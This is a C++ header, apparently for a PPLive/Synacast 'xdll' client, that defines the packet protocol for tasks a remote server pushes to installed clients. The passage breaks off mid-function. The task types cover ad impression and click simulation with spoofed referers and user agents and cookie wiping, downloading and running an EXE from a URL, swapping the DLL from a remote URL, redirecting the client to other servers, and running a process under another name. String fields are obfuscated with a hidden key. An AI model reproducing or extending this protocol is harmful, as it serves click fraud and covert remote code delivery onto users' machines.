
#pragma once

#include <synacast/xdll/Protocol.h>
#include <synacast/xdll/PacketUtil.h>
#include <synacast/xdll/PacketStream.h>
#include <synacast/util/IDGenerator.h>
#include <synacast/util/SynacastUrlEncoding.h>
#include <ppl/std/inttypes.h>
#include <ppl/util/buffer.h>
#include <ppl/io/serializable.h>
#include <boost/noncopyable.hpp>
#include <string>
#include <set>
using std::string;
using std::set;

class XDUrlEncoding
{
public:
	static SynacastUrlEncoding& Instance()
	{
		static SynacastUrlEncoding key_encoding("running");
 		static string key = key_encoding.Decode("4uXa19/T3dM=");			//ppliveva
		static SynacastUrlEncoding encoding(key);

		return encoding;
	}
};

/// 报文头部
class PacketHeader : public Serializable
{
public:
	/// 包类型
	UINT8 Type;
	/// 协议版本号，初始为0x00000001 代表 0.0.0.1
	UINT16 Version;
	/// 报文序列号，同直播的SequenceID
	UINT32 SequenceID;

	PacketHeader( ) : Type( 0 ), Version( 0 ), SequenceID( 0 )
	{
	}

	virtual bool ReadObject( DataInputStream& is )
	{
		return is >> Type >> Version >> SequenceID;
	}

	virtual void WriteObject( DataOutputStream& os ) const
	{
		os << Type << Version << SequenceID;
	}

	virtual size_t GetObjectSize() const
	{
		return object_size;
	}

	enum { object_size = sizeof(UINT8) + sizeof(UINT16) + sizeof(UINT32) };
};


/// 报文头部
class TaskHeader : public Serializable
{
public:
	/// 下一个发起XDRequest和这次发起XDRequest的间隔时间，单位为s
	UINT32 DelayTime;
	/// 下一个发起XDRequest和这次发起XDRequest的间隔时间，单位为s
	UINT8 TaskType;
	/// 后面任务的内容的长度
	UINT16 TaskLength;

	TaskHeader( ) : DelayTime( 0 ), TaskType( 0 ), TaskLength( 0 )
	{
	}

	virtual bool ReadObject( DataInputStream& is )
	{
		return is >> DelayTime >> TaskType >> TaskLength;
	}

	virtual void WriteObject( DataOutputStream& os ) const
	{
		os << DelayTime << TaskType << TaskLength;
	}

	virtual size_t GetObjectSize() const
	{
		return object_size;
	}

	enum { object_size = sizeof(UINT32) + sizeof(UINT8) + sizeof(UINT16) };
};


class TaskInfo : public Serializable
{
public:
	virtual UINT8 GetTaskType() const = 0;
	virtual INT32 GetGroupID() const = 0;
};

class RequestInfo : public Serializable
{
public:
	set<INT32>	VisitedGroups; 
	INT16		ChannelID;
	INT16		RequestType;
	UINT32		Flag;
	string		HugoID;
 	string		PPID;
 	INT16		Is64Bit;
	UINT32		RealIp;

	RequestInfo() : ChannelID(0), RequestType(0), Flag(0), Is64Bit(0), RealIp(0) {}

	bool ReadObject(DataInputStream& is)
	{
		VisitedGroups.clear();

		UINT16 length = 0;
		is  >> length;
		if ( !is ) return false;
		for(int i = 0; i < length; i ++)
		{
			INT32 v;
			is >> v;
			if( !is ) return false;
			VisitedGroups.insert(v);
		}
		
		is >> ChannelID;
		is >> RequestType;
		is >> Flag;
		if( !is ) 
			return false;

		is >> make_packet_reader(HugoID);
		if( !is)
			return false;

		is >> make_packet_reader(PPID);
		if( !is)
			return false;

		is >> Is64Bit;
		if( !is)
			return false;

		is >> RealIp;
		if (!is)
			return false;

		return true;
	}
	void WriteObject(DataOutputStream& os) const
	{
		if( VisitedGroups.size() > 0 )
		{
			os  << (UINT16)VisitedGroups.size();
			for(std::set<INT32>::const_iterator iter = VisitedGroups.begin(); iter != VisitedGroups.end(); iter++ )
			{
				os << *iter;
			}
		}
		else
		{
			os << (UINT16)0;
		}
		os << ChannelID;
		os << RequestType;
		os << Flag;
		os << make_packet_writer(HugoID);
		os << make_packet_writer(PPID);
		os << Is64Bit;
		os << RealIp;
	}

	size_t GetObjectSize() const
	{
		return 
			sizeof(UINT16) + 
			VisitedGroups.size()*sizeof(INT32) +
			sizeof(INT16) + 
			sizeof(INT16) + 
			sizeof(UINT32) +
			sizeof(UINT16) + HugoID.size() +
			sizeof(UINT16) + PPID.size() +
			sizeof(UINT16) +
			sizeof(UINT32);
	}
};

class StatisticRequestInfo : public Serializable
{
public:
	INT16		ChannelID;
	INT16		RequestType;
	UINT32		Flag;
	INT16		CanTipsRun;
	string		HugeID;

	StatisticRequestInfo() : ChannelID(0), RequestType(0), Flag(0), CanTipsRun(0) { }

	bool ReadObject(DataInputStream& is)
	{
		is >> ChannelID;
		is >> RequestType;
		is >> Flag;
		is >> CanTipsRun;
		is >> make_packet_reader(HugeID);
		if( !is ) return false;

		return true;
	}
	void WriteObject(DataOutputStream& os) const
	{
		os << ChannelID;
		os << RequestType;
		os << Flag;
		os << CanTipsRun;
		os << make_packet_writer(HugeID);
	}

	size_t GetObjectSize() const
	{
		return 
			sizeof(INT16) + 
			sizeof(INT16) + 
			sizeof(UINT32) +
			sizeof(UINT16) +
			sizeof(UINT16) + HugeID.size(); 
	}
};

class StatisticResponseInfo : public Serializable
{
public:
	UINT32		KeepAliveTime;

	StatisticResponseInfo() : KeepAliveTime(0) {}

	bool ReadObject(DataInputStream& is)
	{
		is >> KeepAliveTime;
		if( !is ) return false;

		return true;
	}
	void WriteObject(DataOutputStream& os) const
	{
		os << KeepAliveTime;
	}

	size_t GetObjectSize() const
	{
		return 
			sizeof(UINT32);
	}
};


class PacketBuilder : private boost::noncopyable
{
public:
	enum { MAX_PACKET_SIZE = 16 * 1024 };
	PacketBuilder()
	{
		m_buffer.reserve( 4 * 1024 );
	}

	void BuildRequest(const RequestInfo& request_info)
	{
		PacketHeader header;
		header.Type = XD_TYPE_REQUEST;
		header.Version = XD_PROTOCOL_VERSION;
		header.SequenceID = m_sequenceID.New();
		m_buffer.resize( header.GetObjectSize() + request_info.GetObjectSize() );
		PacketOutputStream os( m_buffer.data(), m_buffer.size() );
		os << header << request_info;
	}

	void BuildResonse( UINT32 sequenceID, UINT32 delayTime, const TaskInfo& task )
	{
		PacketHeader header;
		header.Type = XD_TYPE_RESPONSE;
		header.Version = XD_PROTOCOL_VERSION;
		header.SequenceID = sequenceID;
		TaskHeader taskHeader;
		taskHeader.DelayTime = delayTime;
		taskHeader.TaskType = task.GetTaskType();
		taskHeader.TaskLength = task.GetObjectSize();
		m_buffer.resize( header.GetObjectSize() + taskHeader.GetObjectSize() + task.GetObjectSize() );
		PacketOutputStream os( m_buffer.data(), m_buffer.size() );
		os << header << taskHeader << task;
	}

	void BuildStatisticRequest(const StatisticRequestInfo& statistic_request_info)
	{
		PacketHeader header;
		header.Type = XD_TYPE_STATISTIC_REQUEST;
		header.Version = XD_PROTOCOL_VERSION;
		header.SequenceID = m_sequenceID.New();
		m_buffer.resize( header.GetObjectSize() + statistic_request_info.GetObjectSize() );
		PacketOutputStream os( m_buffer.data(), m_buffer.size() );
		os << header << statistic_request_info;
	}

	void BuildStatisticResponse(UINT32 sequenceID, const  StatisticResponseInfo& statistic_response_info)
	{
		PacketHeader header;
		header.Type = XD_TYPE_STATISTIC_RESPONSE;
		header.Version = XD_PROTOCOL_VERSION;
		header.SequenceID = sequenceID;
		m_buffer.resize( header.GetObjectSize() + statistic_response_info.GetObjectSize() );
		PacketOutputStream os( m_buffer.data(), m_buffer.size() );
		os << header << statistic_response_info;
	}

	const BYTE* GetData() const { return m_buffer.data(); }
	size_t GetSize() const { return m_buffer.size(); }

private:
	IDGenerator m_sequenceID;
	byte_buffer m_buffer;
};

class EmptyTaskInfo : public TaskInfo
{
public:
	EmptyTaskInfo()
	{
	}

	virtual bool ReadObject(DataInputStream& is)
	{
		return true;
	}
	virtual void WriteObject(DataOutputStream& os) const
	{
	}
	virtual size_t GetObjectSize() const
	{
		return 0;
	}

	virtual UINT8 GetTaskType() const
	{
		return XD_EMPTY_TASK;
	}

	virtual INT32 GetGroupID() const
	{
		return 0;
	}
};

class NormalTaskInfo : public TaskInfo
{
public:
	/// 转化率，百分之多少的转化率
	UINT16 ClickRate;
	/// 是否控制 浏览器 随机, 0-表示不随机 1-表示随机
	UINT8 BrowserRandom;
	/// 曝光地址
	string ShowUrl;
	/// 曝光Refer地址
	string ShowReferer;
	/// 点击地址
	string ClickUrl;
	/// 点击Refer地址
	string ClickReferer;
	/// 任务所属的组编号
	INT32 GroupID;

	NormalTaskInfo() : ClickRate( 0 ), BrowserRandom( 0 ), GroupID(0)
	{
	}

	virtual bool ReadObject(DataInputStream& is)
	{
		ShowUrl.erase();
		ShowReferer.erase();
		ClickUrl.erase();
		ClickReferer.erase();
		is  >> ClickRate >> BrowserRandom 
			>> make_packet_reader( ShowUrl ) 
			>> make_packet_reader( ShowReferer ) 
			>> make_packet_reader( ClickUrl ) 
			>> make_packet_reader( ClickReferer );
		if ( !is )
		{
			return false;
		}
		is >> GroupID;
		if ( !is )
		{
			APP_EVENT("^^^^ No GroupID");
			is.set_good();
		}

		SynacastUrlEncoding& encoding = XDUrlEncoding::Instance();
		ShowUrl = encoding.Decode( ShowUrl );
		ShowReferer = encoding.Decode( ShowReferer );
		ClickUrl = encoding.Decode( ClickUrl );
		ClickReferer = encoding.Decode( ClickReferer );
		return true;
	}
	virtual void WriteObject(DataOutputStream& os) const
	{
		SynacastUrlEncoding& encoding = XDUrlEncoding::Instance();
		os  << ClickRate << BrowserRandom 
			<< make_packet_writer( encoding.Encode( ShowUrl ) ) 
			<< make_packet_writer( encoding.Encode( ShowReferer ) ) 
			<< make_packet_writer( encoding.Encode( ClickUrl ) ) 
			<< make_packet_writer( encoding.Encode( ClickReferer ) )
			<< GroupID;
	}
	virtual size_t GetObjectSize() const
	{
		SynacastUrlEncoding& encoding = XDUrlEncoding::Instance();
		return sizeof(UINT16) + sizeof(UINT8) 
			 + sizeof(UINT16) + encoding.CalcEncodedLength( ShowUrl.size() )
			 + sizeof(UINT16) + encoding.CalcEncodedLength( ShowReferer.size() ) 
			 + sizeof(UINT16) + encoding.CalcEncodedLength( ClickUrl.size() ) 
			 + sizeof(UINT16) + encoding.CalcEncodedLength( ClickReferer.size() )
			 + sizeof(INT32);
	}

	virtual UINT8 GetTaskType() const
	{
		return XD_NORMAL_TASK;
	}

	virtual INT32 GetGroupID() const
	{
		return GroupID;
	}
};

// 浏览任务协议
class MultiHopTaskInfo : public TaskInfo
{
public:
	UINT8 BrowserRandom;
	string FirstUrl;
	string FirstReferer;
	string HopInfo;
	string RuleInfo;
	INT32 GroupID;
	UINT32 ClickIntervalMin;
	UINT32 ClickIntervalMax;
	UINT32 TimeoutTime;
	UINT32 RemoveCookiesRate;
	string RemoveCookies;
	UINT16 IsSecure;
	UINT32 ServerTime;
	UINT16 IsOpenWindow;
	UINT16 AllowArea;
	UINT16 LoadFlash;
	UINT16 RefererMode;
	string UserAgent;
	UINT16 DirectionalMode;
	string Directional;
	UINT16 UrlFilterType;
	string UrlFilter;
	UINT32 RemoveFlashCookieRate;
	string RemoveFlashCookies;
	UINT32 UaMinWidth;
	UINT32 UaMaxWidth;
	UINT32 UaMinHeight;
	UINT32 UaMaxHeight;
	string Platform;

	MultiHopTaskInfo() 
		: BrowserRandom(0), GroupID(0), ClickIntervalMin(0), ClickIntervalMax(0), TimeoutTime(0), 
		RemoveCookiesRate(0), IsSecure(0), ServerTime(0), IsOpenWindow(0), AllowArea(0), LoadFlash(0),
		RefererMode(0), DirectionalMode(0), UrlFilterType(0),
		RemoveFlashCookieRate(0), UaMinWidth(0), UaMaxWidth(0), UaMinHeight(0), UaMaxHeight(0)
	{
	}

	virtual bool ReadObject(DataInputStream& is)
	{
		FirstUrl.erase();
		FirstReferer.erase();
		HopInfo.erase();
		is	>> BrowserRandom 
			>> make_packet_reader( FirstUrl ) 
			>> make_packet_reader( FirstReferer ) 
			>> make_packet_reader( HopInfo ) 
			>> make_packet_reader( RuleInfo );
		if (!is)
		{
			return false;
		}

		is >> GroupID;
		if (!is)
		{
			APP_EVENT("^^^^ No GroupID");
			is.set_good();
		}

		is >> ClickIntervalMin;
		is >> ClickIntervalMax;
		is >> TimeoutTime;
		if (!is)
		{
			APP_EVENT("^^^ No TimeControl");
			is.set_good();
		}

		is >> RemoveCookiesRate;
		is >> make_packet_reader(RemoveCookies);
		if (!is)
		{
			APP_EVENT("^^^ No RemoveCookies");
			is.set_good();
		}

		is >> IsSecure;
		is >> ServerTime;
		is >> IsOpenWindow;
		is >> AllowArea;
		if (!is)
		{
			APP_EVENT("^^^ No ServerSupport");
			is.set_good();
		}

		is >> LoadFlash;
		if (!is)
		{
			APP_EVENT("^^^ No LoadFlash");
			is.set_good();
		}

		is >> RefererMode;
		if (!is)
		{
			APP_EVENT("^^^^No RefererMode");
			is.set_good();
		}

		is >> make_packet_reader(UserAgent);
		if (!is)
		{
			APP_EVENT("^^^ No UserAgent");
			is.set_good();
		}

		is >> DirectionalMode;
		is >> make_packet_reader(Directional);
		if (!is)
		{
			APP_EVENT("^^^ No Directional");
			is.set_good();
		}

		is >> UrlFilterType;
		is >> make_packet_reader(UrlFilter);
		if (!is)
		{
			APP_EVENT("^^^ No UrlFilter");
			is.set_good();
		}

		is >> RemoveFlashCookieRate;
		is >> make_packet_reader(RemoveFlashCookies);
		if (!is)
		{
			APP_EVENT("^^^ No RemoveFlashCookies");
			is.set_good();
		}
		is >> UaMinWidth;
		is >> UaMaxWidth;
		is >> UaMinHeight;
		is >> UaMaxHeight;
		if (!is)
		{
			APP_EVENT("^^^ No Window Size");
			is.set_good();
		}
		is >> make_packet_reader(Platform);
		if (!is)
		{
			APP_EVENT("^^^ No Platform");
			is.set_good();
		}

		SynacastUrlEncoding& encoding = XDUrlEncoding::Instance();
		FirstUrl = encoding.Decode(FirstUrl);
		FirstReferer = encoding.Decode(FirstReferer);
		HopInfo = encoding.Decode(HopInfo);
		RuleInfo = encoding.Decode(RuleInfo);
		RemoveCookies = encoding.Decode(RemoveCookies);
		UserAgent = encoding.Decode(UserAgent);
		Directional = encoding.Decode(Directional);
		UrlFilter = encoding.Decode(UrlFilter);
		RemoveFlashCookies = encoding.Decode(RemoveFlashCookies);
		Platform = encoding.Decode(Platform);
		return true;
	}

	virtual void WriteObject(DataOutputStream& os) const
	{
		SynacastUrlEncoding& encoding = XDUrlEncoding::Instance();

		os  << BrowserRandom 
			<< make_packet_writer( encoding.Encode( FirstUrl ) ) 
			<< make_packet_writer( encoding.Encode( FirstReferer ) ) 
			<< make_packet_writer( encoding.Encode( HopInfo ) ) 
			<< make_packet_writer( encoding.Encode( RuleInfo ) )
			<< GroupID
			<< ClickIntervalMin
			<< ClickIntervalMax
			<< TimeoutTime
			<< RemoveCookiesRate
			<< make_packet_writer( encoding.Encode( RemoveCookies ) )
			<< IsSecure
			<< ServerTime
			<< IsOpenWindow
			<< AllowArea
			<< LoadFlash
			<< RefererMode
			<< make_packet_writer( encoding.Encode(UserAgent) )
			<< DirectionalMode
			<< make_packet_writer( encoding.Encode(Directional) )
			<< UrlFilterType
			<< make_packet_writer( encoding.Encode(UrlFilter) )
			<< RemoveFlashCookieRate
			<< make_packet_writer( encoding.Encode(RemoveFlashCookies) )
			<< UaMinWidth
			<< UaMaxWidth
			<< UaMinHeight
			<< UaMaxHeight
			<< make_packet_writer( encoding.Encode(Platform) );
	}

	virtual size_t GetObjectSize() const
	{
		SynacastUrlEncoding& encoding = XDUrlEncoding::Instance();
		return sizeof(UINT8) 
			 + sizeof(UINT16) + encoding.CalcEncodedLength( FirstUrl.size() ) 
			 + sizeof(UINT16) + encoding.CalcEncodedLength( FirstReferer.size() ) 
			 + sizeof(UINT16) + encoding.CalcEncodedLength( HopInfo.size() )
			 + sizeof(UINT16) + encoding.CalcEncodedLength( RuleInfo.size() )
			 + sizeof(UINT32)
			 + sizeof(UINT32)
			 + sizeof(UINT32)
			 + sizeof(UINT32)
			 + sizeof(UINT32)
			 + sizeof(UINT16) + encoding.CalcEncodedLength( RemoveCookies.size() )
			 + sizeof(UINT16)
			 + sizeof(UINT16)
			 + sizeof(UINT32)
			 + sizeof(UINT16)
			 + sizeof(UINT16)	// LoadFlash
			 + sizeof(UINT16)	// RefererMode
			 + sizeof(UINT16) + encoding.CalcEncodedLength( UserAgent.size() )		// UserAgent
			 + sizeof(UINT16)	// DirectionalMode
			 + sizeof(UINT16) + encoding.CalcEncodedLength( Directional.size() )	// Directional
			 + sizeof(UINT16)	// UrlFilterType
			 + sizeof(UINT16) + encoding.CalcEncodedLength( UrlFilter.size() )
			 + sizeof(UINT32)	// RemoveFlashCookiesRate
			 + sizeof(UINT16) + encoding.CalcEncodedLength( RemoveFlashCookies.size() )
			 + sizeof(UINT32)
			 + sizeof(UINT32)
			 + sizeof(UINT32)
			 + sizeof(UINT32)
			 + sizeof(UINT16) + encoding.CalcEncodedLength( Platform.size() );
	}

	virtual UINT8 GetTaskType() const
	{
		return XD_MULTI_HOP_TASK;
	}

	virtual INT32 GetGroupID() const
	{
		return GroupID;
	}
};


class IUTTaskInfo : public TaskInfo
{
public:
	UINT32 MinRunDuration;
	UINT32 MaxRunDuration;
	string IUTProcessName;
	string NewProcessName;
	INT32 GroupID;

	IUTTaskInfo() : MinRunDuration(0), MaxRunDuration(0), GroupID(0)
	{
	}

	virtual bool ReadObject(DataInputStream& is)
	{
		IUTProcessName.erase();
		NewProcessName.erase();
		is  >> MinRunDuration 
			>> MaxRunDuration 
			>> make_packet_reader( IUTProcessName )
			>> make_packet_reader( NewProcessName );
		if ( !is )
			return false;
		is >> GroupID;
		if ( !is )
		{
			APP_EVENT("^^^^ No GroupID");
			is.set_good();
		}

		SynacastUrlEncoding& encoding = XDUrlEncoding::Instance();
		IUTProcessName = encoding.Decode( IUTProcessName );
		NewProcessName = encoding.Decode( NewProcessName );
		return true;
	}
	virtual void WriteObject(DataOutputStream& os) const
	{
		SynacastUrlEncoding& encoding = XDUrlEncoding::Instance();
		os  << MinRunDuration 
			<< MaxRunDuration 
			<< make_packet_writer( encoding.Encode( IUTProcessName ) ) 
			<< make_packet_writer( encoding.Encode( NewProcessName ) )
			<< GroupID;
	}
	virtual size_t GetObjectSize() const
	{
		SynacastUrlEncoding& encoding = XDUrlEncoding::Instance();
		return sizeof(UINT32) * 2 
			 + sizeof(UINT16) + encoding.CalcEncodedLength( IUTProcessName.size() ) 
			 + sizeof(UINT16) + encoding.CalcEncodedLength( NewProcessName.size() )
			 + sizeof(UINT32);
	}

	virtual UINT8 GetTaskType() const
	{
		return XD_IUT_TASK;
	}
	virtual INT32 GetGroupID() const
	{
		return GroupID;
	}
};

class EXETaskInfo : public TaskInfo
{
public:
	USHORT OSVersion;
	USHORT IsSecure;
	USHORT IsOnce;
	UINT32 ExeFileLength;
	string ExeName;
	string ExeHttpUrl;
	string Forbiddens;
	UINT32 GroupID;

	EXETaskInfo() : OSVersion(0), IsSecure(0), IsOnce(0), ExeFileLength(0)
	{
	}

	virtual bool ReadObject(DataInputStream& is)
	{
		ExeName.erase();
		ExeHttpUrl.erase();
		is  >> OSVersion 
			>> IsSecure 
			>> IsOnce
			>> ExeFileLength
			>> make_packet_reader( ExeName )
			>> make_packet_reader( ExeHttpUrl )
			>> make_packet_reader( Forbiddens )
			>> GroupID;
		if ( !is )
			return false;

		SynacastUrlEncoding& encoding = XDUrlEncoding::Instance();
		ExeName = encoding.Decode( ExeName );
		ExeHttpUrl = encoding.Decode( ExeHttpUrl );
		Forbiddens = encoding.Decode( Forbiddens );
		return true;
	}
	virtual void WriteObject(DataOutputStream& os) const
	{
		SynacastUrlEncoding& encoding = XDUrlEncoding::Instance();
		os  << OSVersion 
			<< IsSecure
			<< IsOnce
			<< ExeFileLength
			<< make_packet_writer( encoding.Encode(ExeName) ) 
			<< make_packet_writer( encoding.Encode(ExeHttpUrl) )
			<< make_packet_writer( encoding.Encode(Forbiddens) )
			<< GroupID;
	}
	virtual size_t GetObjectSize() const
	{
		SynacastUrlEncoding& encoding = XDUrlEncoding::Instance();
		return sizeof(UINT16) 
			 + sizeof(UINT16)
			 + sizeof(UINT16)
			 + sizeof(UINT32)
			 + sizeof(UINT16) + encoding.CalcEncodedLength( ExeName.size() ) 
			 + sizeof(UINT16) + encoding.CalcEncodedLength( ExeHttpUrl.size() )
			 + sizeof(UINT16) + encoding.CalcEncodedLength( Forbiddens.size() )
			 + sizeof(UINT32);
	}

	virtual UINT8 GetTaskType() const
	{
		return XD_EXE_TASK;
	}
	virtual INT32 GetGroupID() const
	{
		return GroupID;
	}
};

class PostTaskInfo : public TaskInfo
{
public:
	UINT8 BrowserRandom;
	string Url;
	string Referer;
	string Content;
	string ContentType;
	INT32 GroupID;

	PostTaskInfo() : BrowserRandom(0), GroupID(0)
	{
	}

	virtual bool ReadObject(DataInputStream& is)
	{
		Url.erase();
		Referer.erase();
		Content.erase();
		ContentType.erase();
		is  >> BrowserRandom 
			>> make_packet_reader( Url )
			>> make_packet_reader( Referer )
			>> make_packet_reader( Content )
			>> make_packet_reader( ContentType )
			>> GroupID;
		if ( !is )
			return false;

		SynacastUrlEncoding& encoding = XDUrlEncoding::Instance();
		Url = encoding.Decode( Url );
		Referer = encoding.Decode( Referer );
		Content = encoding.Decode( Content );
		ContentType = encoding.Decode( ContentType );
		return true;
	}
	virtual void WriteObject(DataOutputStream& os) const
	{
		SynacastUrlEncoding& encoding = XDUrlEncoding::Instance();
		os  << BrowserRandom 
			<< make_packet_writer( encoding.Encode(Url) ) 
			<< make_packet_writer( encoding.Encode(Referer) )
			<< make_packet_writer( encoding.Encode(Content) )
			<< make_packet_writer( encoding.Encode(ContentType) )
			<< GroupID;
	}
	virtual size_t GetObjectSize() const
	{
		SynacastUrlEncoding& encoding = XDUrlEncoding::Instance();
		return sizeof(UINT16) 
			 + sizeof(UINT16) + encoding.CalcEncodedLength( Url.size() ) 
			 + sizeof(UINT16) + encoding.CalcEncodedLength( Referer.size() )
			 + sizeof(UINT16) + encoding.CalcEncodedLength( Content.size() )
			 + sizeof(UINT16) + encoding.CalcEncodedLength( ContentType.size() )
			 + sizeof(UINT32);
	}

	virtual UINT8 GetTaskType() const
	{
		return XD_POST_TASK;
	}

	virtual INT32 GetGroupID() const
	{
		return GroupID;
	}
};

class UpdateTaskInfo : public TaskInfo
{
public:
	string	BeginVersion;
	string	EndVersion;
	string	DistVersion;
	UINT	DllFileLength;
	string	DistUrl;
	
	UpdateTaskInfo() : DllFileLength(0)
	{
	}
	
	virtual bool ReadObject(DataInputStream& is)
	{
		BeginVersion.erase();
		EndVersion.erase();
		DistVersion.erase();
		DistUrl.erase();
		is  >> make_packet_reader( BeginVersion )
			>> make_packet_reader( EndVersion )
			>> make_packet_reader( DistVersion )
			>> DllFileLength
			>> make_packet_reader( DistUrl );
		if ( !is )
			return false;
		
		SynacastUrlEncoding& encoding = XDUrlEncoding::Instance();
		BeginVersion = encoding.Decode( BeginVersion );
		EndVersion = encoding.Decode( EndVersion );
		DistVersion = encoding.Decode( DistVersion );
		DistUrl = encoding.Decode( DistUrl );
		return true;
	}
	virtual void WriteObject(DataOutputStream& os) const
	{
		SynacastUrlEncoding& encoding = XDUrlEncoding::Instance();
		os  << make_packet_writer( encoding.Encode(BeginVersion) ) 
			<< make_packet_writer( encoding.Encode(EndVersion) )
			<< make_packet_writer( encoding.Encode(DistVersion) )
			<< DllFileLength
			<< make_packet_writer( encoding.Encode(DistUrl) );
	}
	virtual size_t GetObjectSize() const
	{
		SynacastUrlEncoding& encoding = XDUrlEncoding::Instance();
		return sizeof(UINT16) 
			+ sizeof(UINT16) + encoding.CalcEncodedLength( BeginVersion.size() ) 
			+ sizeof(UINT16) + encoding.CalcEncodedLength( EndVersion.size() )
			+ sizeof(UINT16) + encoding.CalcEncodedLength( DistVersion.size() )
			+ sizeof(UINT32)
			+ sizeof(UINT16) + encoding.CalcEncodedLength( DistUrl.size() );
	}
	
	virtual UINT8 GetTaskType() const
	{
		return XD_UPDATE_TASK;
	}

	virtual INT32 GetGroupID() const
	{
		return 0;
	}
};


class RedirectTaskInfo : public TaskInfo
{
public:
	string	DistServer;
	UINT16	DistServerPort;
	UINT16	IsAlways;
	UINT16	RequestType;

	
	RedirectTaskInfo() : DistServerPort(0), RequestType(0), IsAlways(0)
	{
	}
	
	virtual bool ReadObject(DataInputStream& is)
	{
		DistServer.erase();

		is  >> make_packet_reader( DistServer )
			>> DistServerPort
			>> IsAlways
			>> RequestType;
		if ( !is )
			return false;
		
		SynacastUrlEncoding& encoding = XDUrlEncoding::Instance();
		DistServer = encoding.Decode( DistServer );
		return true;
	}
	virtual void WriteObject(DataOutputStream& os) const
	{
		SynacastUrlEncoding& encoding = XDUrlEncoding::Instance();
		os  << make_packet_writer( encoding.Encode(DistServer) ) 
			<< DistServerPort
			<< IsAlways
			<< RequestType;
	}
	virtual size_t GetObjectSize() const
	{
		SynacastUrlEncoding& encoding = XDUrlEncoding::Instance();
		return sizeof(UINT16) 
			+ sizeof(UINT16) + encoding.CalcEncodedLength( DistServer.size() ) 
			+ sizeof(UINT16)
			+ sizeof(UINT16)
			+ sizeof(UINT16);
	}
	
	virtual UINT8 GetTaskType() const
	{
		return XD_REDIRECT_TASK;
	}

	virtual INT32 GetGroupID() const
	{
		return 0;
	}
};


class ConfigTaskInfo : public TaskInfo
{
public:
	string	Url;
	UINT16	Type;
	INT32 GroupID;
	
	ConfigTaskInfo() : Type(0), GroupID(0)
	{
	}
	
	virtual bool ReadObject(DataInputStream& is)
	{
		Url.erase();
		
		is  >> make_packet_reader(Url)
			>> Type
			>> GroupID;
		if ( !is )
			return false;
		
		SynacastUrlEncoding& encoding = XDUrlEncoding::Instance();
		Url = encoding.Decode(Url);
		return true;
	}
	virtual void WriteObject(DataOutputStream& os) const
	{
		SynacastUrlEncoding& encoding = XDUrlEncoding::Instance();
		os  << make_packet_writer( encoding.Encode(Url) ) 
			<< Type
			<< GroupID;
	}
	virtual size_t GetObjectSize() const
	{
		SynacastUrlEncoding& encoding = XDUrlEncoding::Instance();
		return sizeof(UINT16) 
			+ encoding.CalcEncodedLength(Url.size())
			+ sizeof(UINT16)
			+ sizeof(INT32);
	}
	
	virtual UINT8 GetTaskType() const
	{
		return XD_CONFIG_TASK;
	}
	
	virtual INT32 GetGroupID() const
	{
		return GroupID;
	}
};

class ClientSimTaskInfo : public TaskInfo
{
public:
	string	AdType;
	INT32	Maxl;
	INT32	Maxc;
	INT32	GroupID;
	UINT16	IsCommon;

	ClientSimTaskInfo() : Maxl(0), Maxc(0), IsCommon(0)
	{
	}

	virtual bool ReadObject(DataInputStream& is)
	{
		AdType.erase();

		is  >> make_packet_reader(AdType)
			>> Maxl
			>> Maxc
			>> GroupID;
		if ( !is )
		{
			return false;
		}

		is >> IsCommon;
		if ( !is )
		{
			APP_EVENT("^^^ No IsCommon");
			is.set_good();
		}

		SynacastUrlEncoding& encoding = XDUrlEncoding::Instance();
		AdType = encoding.Decode(AdType);
		return true;
	}
	virtual void WriteObject(DataOutputStream& os) const
	{
		SynacastUrlEncoding& encoding = XDUrlEncoding::Instance();
		os  << make_packet_writer( encoding.Encode(AdType) ) 
			<< Maxl
			<< Maxc
			<< GroupID
			<< IsCommon;
	}
	virtual size_t GetObjectSize() const
	{
		SynacastUrlEncoding& encoding = XDUrlEncoding::Instance();
		return sizeof(UINT16) 
			+ encoding.CalcEncodedLength(AdType.size())
			+ sizeof(INT32)
			+ sizeof(INT32)
			+ sizeof(INT32)
			+ sizeof(UINT16);
	}

	virtual UINT8 GetTaskType() const
	{
		return XD_CLIENTSIM_TASK;
	}

	virtual INT32 GetGroupID() const
	{
		return GroupID;
	}
};


class VASTSimTaskInfo : public TaskInfo
{
public:
	INT16	IsClose;
	INT32	Maxl;
	INT32	Maxc;
	INT32	GroupID;

	VASTSimTaskInfo() : IsClose(0), Maxl(0), Maxc(0)
	{
	}

	virtual bool ReadObject(DataInputStream& is)
	{
		is  >> IsClose
			>> Maxl
			>> Maxc
			>> GroupID;
		if ( !is )
			return false;

		return true;
	}
	virtual void WriteObject(DataOutputStream& os) const
	{
		os  << IsClose
			<< Maxl
			<< Maxc
			<< GroupID;
	}
	virtual size_t GetObjectSize() const
	{
		return sizeof(UINT16) 
			+ sizeof(INT32)
			+ sizeof(INT32)
			+ sizeof(INT32);
	}

	virtual UINT8 GetTaskType() const
	{
		return XD_VASTSIM_TASK;
	}

	virtual INT32 GetGroupID() const
	{
		return GroupID;
	}
};

class VASTExSimTaskInfo : public TaskInfo
{
public:
	UINT16	IsSecure;
	string	VastUrl;
	INT32	GroupID;

	VASTExSimTaskInfo()
	{
	}

	virtual bool ReadObject(DataInputStream& is)
	{
		is	>> IsSecure
			>> make_packet_reader(VastUrl)
			>> GroupID;
		if ( !is )
			return false;

		SynacastUrlEncoding& encoding = XDUrlEncoding::Instance();
		VastUrl = encoding.Decode(VastUrl);

		return true;
	}
	virtual void WriteObject(DataOutputStream& os) const
	{
		SynacastUrlEncoding& encoding = XDUrlEncoding::Instance();
		os  << IsSecure
			<< make_packet_writer(encoding.Encode(VastUrl)) 
			<< GroupID;
	}
	virtual size_t GetObjectSize() const
	{
		SynacastUrlEncoding& encoding = XDUrlEncoding::Instance();
		return sizeof(UINT16) 
			+ sizeof(UINT16) + encoding.CalcEncodedLength(VastUrl.size())
			+ sizeof(INT32);
	}

	virtual UINT8 GetTaskType() const
	{
		return XD_VASTEXSIM_TASK;
	}

	virtual INT32 GetGroupID() const
	{
		return GroupID;
	}
};

class ClientExSimTaskInfo : public TaskInfo
{
public:
	UINT16	IsSecure;
	string	ClientUrl;
	INT32	GroupID;
	
	ClientExSimTaskInfo()
	{
	}
	
	virtual bool ReadObject(DataInputStream& is)
	{
		is	>> IsSecure
			>> make_packet_reader(ClientUrl)
			>> GroupID;
		if ( !is )
			return false;
		
		SynacastUrlEncoding& encoding = XDUrlEncoding::Instance();
		ClientUrl = encoding.Decode(ClientUrl);
		
		return true;
	}
	virtual void WriteObject(DataOutputStream& os) const
	{
		SynacastUrlEncoding& encoding = XDUrlEncoding::Instance();
		os  << IsSecure
			<< make_packet_writer(encoding.Encode(ClientUrl)) 
